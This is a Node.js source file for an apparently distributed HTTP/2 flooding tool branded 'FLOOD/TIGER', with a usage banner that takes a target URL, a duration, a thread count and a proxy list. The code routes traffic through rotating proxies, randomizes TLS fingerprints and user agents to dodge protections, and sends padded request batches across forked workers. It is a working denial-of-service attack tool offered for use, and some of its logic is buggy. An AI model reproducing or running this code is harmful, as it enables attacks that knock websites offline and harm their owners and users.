const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const https = require('https');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
const chalk = require('chalk');

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'PsetTimeoutarserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let cfray = {};
let iii = {};
let cachecontrol = {};
let custom_table = 4096;
let custom_window = 65535;
let custom_header = 65535;
let custom_update = 65535;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4], 10);
setTimeout(() => {
    process.exit(1);
}, time * 1000);
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(
        chalk.white.bold('Telegram:           ') + chalk.blue.bold('    t.me/ThaiDuongScript')
    );
    console.log(
        chalk.white.bold('Product:             ') + chalk.magenta.bold('   FLOOD/TIGER v1.0')
    );
    console.log(
        chalk.white.bold('Date:                   ') + chalk.bgWhite.black.bold("14/6/2025")
    );
    console.log(
        chalk.underline.white.bold('\nUsage') + chalk.reset(':')
    );
    console.log(
        chalk.white(`     node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`)
    );
    console.log(
        chalk.underline.white.bold('\nExample') + chalk.reset(':')
    );
    console.log(
        chalk.italic.white(`     node ${process.argv[1]} GET "https://iristeam.sbs/" 60 8 300 proxy.txt --delay 1 --debug --query 1`)
    );
    console.log(
        chalk.underline.white.bold('\nOptions') + chalk.reset(':')
    );
    console.log(
        chalk.white('    --delay      ') + chalk.hex('#FFA500')('1-inf') + chalk.italic.white('   ~   Delay between requests.')
    );
    console.log(
        chalk.white('    --debug      ') + chalk.italic.white('        ~   Show status code.')
    );
    console.log(
        chalk.white('    --query     ') + chalk.italic.white('        ~   query string with rand ex 1 - ?robots.txt= 2 - ?randomstring 3 - ?q=fwfwwffw.')
    );
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

const url = new URL(target);
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(3, 4); // Type: RST_STREAM
    frameHeader.writeUInt8(0, 5); // Flags: 0
    frameHeader.writeUInt32BE(streamId, 5);
    const error = Buffer.alloc(4);
    error.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, error]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


if (url.pathname.includes("%RAND%")) {
const endpoints = [
  'register', 'signup', 'join',
  'submit', 'contact', 'form', 'feedback',
  'create', 'add', 'new',
  'upload', 'sendfile', 'avatar',
  'comment', 'review', 'message',
  'api/register', 'api/submit', 'api/create'
];
    const randomValue = endpoints[Math.floor(Math.random() * endpoints.length)];
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const legitIP = generateLegitIP();
const proxyStats = {};

function trackSuccess(proxyKey) {
    if (!proxyStats[proxyKey]) {
        proxyStats[proxyKey] = { successCount: 0, rateLimit: 0 };
    }
    proxyStats[proxyKey].successCount++;
}

function handle429(proxyKey) {
    if (!proxyStats[proxyKey]) return;
    if (proxyStats[proxyKey].rateLimit === 0) {
        proxyStats[proxyKey].rateLimit = proxyStats[proxyKey].successCount;
        console.log(`[调试] 代理 ${proxyKey} 因 429 状态码 将 RPS 调整为 ${proxyStats[proxyKey].rateLimit}`);
    }
    proxyStats[proxyKey].successCount = 0;
}

function getRatelimitFor(proxyKey, defaultRate) {
    if (!proxyStats[proxyKey]) return defaultRate;
    return proxyStats[proxyKey].rateLimit > 0 ? proxyStats[proxyKey].rateLimit : defaultRate;
}

function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS14061", country: "SG", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS16509", country: "DE", ip: "3.120.0." },
        { asn: "AS14618", country: "JP", ip: "52.192.0." },
        { asn: "AS32934", country: "US", ip: "157.240.0." },
        { asn: "AS54113", country: "US", ip: "104.244.42." },
        { asn: "AS15133", country: "US", ip: "69.171.250." }
    ];
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

const cipherSuites = [
    "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
    "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256",
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
];

const sigAlgs = [
    "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384",
    "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha512",
    "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
];

const ecdhCurves = [
    "X25519:P-256:P-384",
    "X25519:P-256",
    "P-256:P-384:P-521",
];

function go() {
    const [proxyHost, proxyPort, proxyUser, proxyPass] = proxy[~~(Math.random() * proxy.length)].split(':');
    const basicAuth = proxyUser && proxyPass ? 'Proxy-Authorization: Basic ' + Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64') + '\r\n' : '';

    if (!proxyPort || isNaN(proxyPort)) {
        go();
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        const userAgents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 OPR/123.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Brave/123.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Duck/1.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0 Tor/12.5.6"
        ];
        const proxyUA = userAgents[Math.floor(Math.random() * userAgents.length)];
        netSocket.write(
            `CONNECT ${url.host}:443 HTTP/1.1\r\n` +
            `Host: ${url.host}:443\r\n` +
            `User-Agent: ${proxyUA}\r\n` +
            `Connection: keep-alive\r\n` +
            `Proxy-Connection: keep-alive\r\n` +
            (basicAuth || '') +
            `Accept: */*\r\n` +
            `Accept-Language: en-US,en;q=0.9\r\n` +
            `\r\n`
        );

        netSocket.once('data', (data) => {
            if (!data.toString().includes('200')) {
                netSocket.destroy();
                go();
                return;
            }

            const tlsSocket = tls.connect({
                socket: netSocket,
                minVersion: "TLSv1.3",
                maxVersion: "TLSv1.3",
                ciphers: cipherSuites[Math.floor(Math.random() * cipherSuites.length)],
                sigalgs: sigAlgs[Math.floor(Math.random() * sigAlgs.length)],
                ecdhCurve: ecdhCurves[Math.floor(Math.random() * ecdhCurves.length)],
                servername: url.hostname,
                secure: true,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2'],
                sessionTimeout: 5000,
                ticketKeys: crypto.randomBytes(48),
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET,
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }

                    function main() {
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    main();
                                }, isFull ? 1000 : 1000 / getRatelimitFor(`${proxyHost}:${proxyPort}`, parseInt(ratelimit)));
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    }

                    main();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy());
                    });
                    return;
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_table],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_header],
                        [8, 1],
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);

                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }

                            if (frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')?.[1];
                                const retryAfter = hpack.decode(frame.payload).find(x => x[0] == 'retry-after')?.[1];
                                const cache = hpack.decode(frame.payload).find(x => x[0] == 'cf-cache-status')?.[1];
                                const idiot = hpack.decode(frame.payload).find(x => x[0] == 'cache-control')?.[1];
                                const cf = hpack.decode(frame.payload).find(x => x[0] == 'cf-ray')?.[1];

                                if (cache) {
                                    cachecontrol = parseInt(cache); 
                                } else {
                                    cachecontrol = "DYNAMIC";
                                }

                                if (idiot) {
                                    iii = idiot;
                                } else {
                                    iii = "max-age=0";
                                }

                                if (cf) {
                                    cfray = cf;
                                } else {
                                    cfray = "null";
                                }

                                if (status == "403" || status == "401") {
                                    
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    netSocket.end(() => netSocket.destroy());
                                   go();
                                } else if (status == "429") {
                                    handle429(`${proxyHost}:${proxyPort}`);
                                    if (retryAfter) {
                                        const retryDelay = parseInt(retryAfter) || 5000;
                                        if (debugMode) console.log(`[调试] 收到 Retry-After: ${retryAfter}s 缓存: cf-cache-status: ${cachecontrol} 反馈: ${iii} ${cfray}`);
                                        headers.push(["cache-control", iii]);
                                        headers.push(["cf-ray", cfray]);
                                        setTimeout(() => {
                                            tlsSocket.end(() => tlsSocket.destroy());
                                            netSocket.end(() => netSocket.destroy());
                                            go();
                                        }, retryDelay);
                                    } else {
                                        tlsSocket.end(() => tlsSocket.destroy());
                                        netSocket.end(() => netSocket.destroy());
                                        go();
                                    }
                                } else if (status) {
                                    if (!statuses[status]) statuses[status] = 0;
                                    statuses[status]++;
                                    trackSuccess(`${proxyHost}:${proxyPort}`);
                                }
                            }

                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {
                                        if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
                                        statuses["GOAWAY"]++;
                                    }
                                    tlsSocket.write(encodeRstStream(streamId, 1));
                                    tlsSocket.end(() => tlsSocket.destroy());
                                    netSocket.end(() => netSocket.destroy());
                                }
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.on('close', () => {
                    if (debugMode) {
                        if (!statuses["CLOSED"]) statuses["CLOSED"] = 0;
                        statuses["CLOSED"]++;
                    }
                });

                tlsSocket.write(Buffer.concat(frames));


                function main() {
                    if (tlsSocket.destroyed) return;
                    const a = getRandomInt(128,138);
                    const b = getRandomInt(128,138);
                    const requests = [];
                    const userAgents = [
                        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.0.0 Safari/537.36`,
                        `Mozilla/5.0 (X11; Linux) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${b}.0.0.0 Safari/537.36`,
                        `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${a}.0) Gecko/20100101 Firefox/${a}.0`,
                        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.0.0 Safari/537.36 OPR/${a-10}.0.0.0`,
                        `Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15`,
                        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.0.0 Safari/537.36 Edg/${a}.0.0.0`,
                        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.0.0 Safari/537.36 Brave/${a-10}.0.0.0`,
                        `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${a}.0.0.0 Safari/537.36 Duck/1.0`,
                        `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${a}.0) Gecko/20100101 Firefox/${a}.0 Tor/12.5.6`
                    ];
                    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                    const chromeVer = userAgent.includes("Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome");
                    const linuxVer = userAgent.includes("Linux");
                    const safariVer = userAgent.includes("Safari/605.1.15");
                    const edgeVer = userAgent.includes("Edg/");
                    const operaVer = userAgent.includes("OPR/");
                    const braveVer = userAgent.includes("Brave/");
                    const duckVer = userAgent.includes("Duck/");
                    const torVer = userAgent.includes("Tor/");

                    const headers = [
                        [":method", reqmethod],
                        [":authority", url.hostname],
                        [":scheme", "https"],
                        [":path", query ? handleQuery(query) : url.pathname],
                        ["user-agent", userAgent],
                        ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],
                        ["accept-encoding", "gzip, deflate, br"],
                        ["accept-language", "en-US,en;q=0.9"],
                        ["sec-fetch-site", "none"],
                        ["sec-fetch-mode", "navigate"],
                        ["sec-fetch-dest", "document"],
                        ["upgrade-insecure-requests", "1"],
                    ];

                    if (chromeVer) {
                        headers.push(
                            ["sec-ch-ua", `"Not_A Brand";v="8", "Chromium";v="${a}", "Google Chrome";v="${a}"`],
                            ["sec-ch-ua-mobile", "?0"],
                            ["sec-ch-ua-platform", '"Windows"']
                        );
                    }
                    if (linuxVer) {
                        headers.push(
                            ["sec-ch-ua", `"Not_A Brand";v="24", "Chromium";v="${b}", "Google Chrome";v="${b}"`],
                            ["sec-ch-ua-mobile", "?1"],
                            ["sec-ch-ua-platform", '"Linux"']
                        );
                    }
                    if (safariVer) {
                        headers.push(
                            ["sec-ch-ua", `"Not_A Brand";v="8", "Safari";v="17.4", "AppleWebKit";v="605.1.15"`],
                            ["sec-ch-ua-mobile", "?0"],
                            ["sec-ch-ua-platform", '"macOS"']
                        );
                    }
                    if (edgeVer) {
                        headers.push(
                            ["sec-ch-ua", `"Not_A Brand";v="8", "Chromium";v="${a}", "Microsoft Edge";v="${a}"`],
                            ["sec-ch-ua-mobile", "?0"],
                            ["sec-ch-ua-platform", '"Windows"']
                        );
                    }
                    if (operaVer) {
                        headers.push(
                            ["sec-ch-ua", `"Not_A Brand";v="8", "Chromium";v="${a}", "Opera";v="${a-10}"`],
                            ["sec-ch-ua-mobile", "?0"],
                            ["sec-ch-ua-platform", '"Windows"']
                        );
                    }
                    if (braveVer) {
                        headers.push(
                            ["sec-ch-ua", `"Not_A Brand";v="8", "Chromium";v="${a}", "Brave";v="${a-10}"`],
                            ["sec-ch-ua-mobile", "?0"],
                            ["sec-ch-ua-platform", '"Windows"']
                        );
                    }
                    if (duckVer) {
                        headers.push(
                            ["sec-ch-ua", `"Not_A Brand";v="8", "Chromium";v="${a}", "DuckDuckGo";v="1.0"`],
                            ["sec-ch-ua-mobile", "?0"],
                            ["sec-ch-ua-platform", '"Windows"']
                        );
                    }
                    if (torVer) {
                        headers.push(
                            ["sec-ch-ua", `"Not_A Brand";v="8", "Firefox";v="${a}", "Tor Browser";v="12.5.6"`],
                            ["sec-ch-ua-mobile", "?0"],
                            ["sec-ch-ua-platform", '"Windows"']
                        );
                    }

for (let i = 0; i < 30; i++) {
    headers.push([`x-custom-${i}`, randstr(100)]); // Gửi 100 header tùy chỉnh
}
headers.push(["cookie", "sessid=" + randstr(100)]); 
headers.push(["referer", target + "?ref=" + randstr(100)]); 
    

  
                    function handleQuery(query) {
                        if (query === '1') {
                            return url.pathname + '?robots.txt=' + randstr(30) + '_' + randstr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstr(8);
                        } else if (query === '2') {
                            return url.pathname + `?${randstr(10)}`;
                        } else if (query === '3') {
                            return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                        } else {
                            return url.pathname;
                        }
                    }

                    let activeStreams = 0;
function keepFlooding() {
    if (tlsSocket.destroyed) return;
    const batch = [];

    for (let i = 0; i < 50; i++) {
        const hpack = new HPACK();
        hpack.setTableSize(4096);
        const headersCopy = [...headers]; // giữ nguyên
        const packed = hpack.encode(headersCopy);
        const flags = 0x1 | 0x4; // END_STREAM + END_HEADERS
        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
        batch.push(encodedFrame);
        streamId += 2;
        activeStreams++;
    }

    tlsSocket.write(Buffer.concat(batch), (err) => {
        if (!err && activeStreams < 1000) {
            setTimeout(keepFlooding, 300); // Gửi mỗi 300ms
        }
    });
}
keepFlooding();


                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (err) {
                            tlsSocket.end(() => tlsSocket.destroy());
                            return;
                        }
                        setTimeout(() => {
                            main();
                        }, getRandomInt(50, 200) + (delay || 1000 / getRatelimitFor(`${proxyHost}:${proxyPort}`, parseInt(ratelimit))));
                    });
                }
                main();
            }).on('error', (err) => {
                tlsSocket.destroy();
                go();
            });
        });
    });

    netSocket.on('error', (err) => {
        netSocket.destroy();
        go();
    });

    netSocket.on('close', () => {
        go();
    });
}

setInterval(() => {
    timer++;
}, 1000);

if (cluster.isMaster) {
    const workers = {};
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Sent Attack Successfully`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });

    if (debugMode) {
        const colorCode = (code) => {
            const red = chalk.red.bold;
            const green = chalk.green.bold;
            const gray = chalk.gray.bold;
            if (code == 200) return green(code);
            if ([403, 502, 503, 504, 520, 522].includes(+code)) return red(code);
            return gray(code);
        };
        var count = 1;
        setInterval(() => {
            let statusesAll = {};
            let totalConnections = 0;
            for (let w in workers) {
                if (workers[w][0].state === 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (!statusesAll[code]) statusesAll[code] = 0;
                            statusesAll[code] += st[code];
                            totalConnections += st[code];
                        }
                    }
                }
            }
            const statusCodes = Object.entries(statusesAll)
                .map(([code, count]) => `${colorCode(code)}: ${count}`)
                .join(', ');
            const realTotal = `[${totalConnections}]`;
            const name = chalk.yellow('[FLOOD/TIGER]');
            const workerId = chalk.cyanBright(`[${time-count}/${time}]`);
            console.log(`${name} Time: ${workerId} Status: [${statusCodes}] Cluster: [${threads}/${threads}] Alive: ${realTotal} => ${target}`);
            count++;
        }, 1000);
    }

    setTimeout(() => process.exit(1), time * 1000);
} else {
    let consssas = 0;
    let someee = setInterval(() => {
        if (true) {
            consssas++;
        } else {
            clearInterval(someee);
            return;
        }
        go();
    }, 0);

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push(statuses);
            statuses = {};
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}
